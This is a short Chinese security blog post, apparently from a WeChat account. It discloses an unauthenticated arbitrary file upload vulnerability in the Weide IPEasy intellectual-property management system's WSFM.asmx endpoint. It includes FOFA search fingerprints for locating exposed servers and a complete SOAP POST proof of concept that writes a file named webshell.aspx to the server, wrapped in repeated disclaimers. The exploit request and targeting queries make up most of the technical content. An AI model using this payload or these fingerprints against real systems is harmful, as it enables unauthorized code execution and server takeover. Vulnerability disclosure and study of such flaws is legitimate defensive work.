#  唯德科创 IPEasy 知易通 WSFM 任意文件上传漏洞   
 HK安全小屋   2025-06-05 14:00  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
唯徳知识产权管理系统 /AutoUpdate/WSFM.asmx 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。  
唯徳知识产权管理系统  
  
  
影响版本：  
  
  
唯徳知识产权管理系统  
  
  
  
FOFA:  
```
body="JSCOMM/language.js"
icon_hash="511014626"
```  
  
  
POC：  
```
POST /AutoUpdate/WSFM.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: 1254
SOAPAction: "http://tempuri.org/UploadFileWordTemplate"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <UploadFileWordTemplate xmlns="http://tempuri.org/">
      <fileByteArray>dGVzdHdlYnNoZWxs</fileByteArray>
      <remotePath>/TemplateFiles/webshell.aspx</remotePath>
    </UploadFileWordTemplate>
  </soap:Body>
</soap:Envelope>
```  
  
成功完成文件上传  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI11T70BIrOnIfw8ib3EiabPFK3EffTOGXfwukgu3JY2iaUc97A5p2NAywicrag5yWnn9xT2fhkL8qVMrA/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
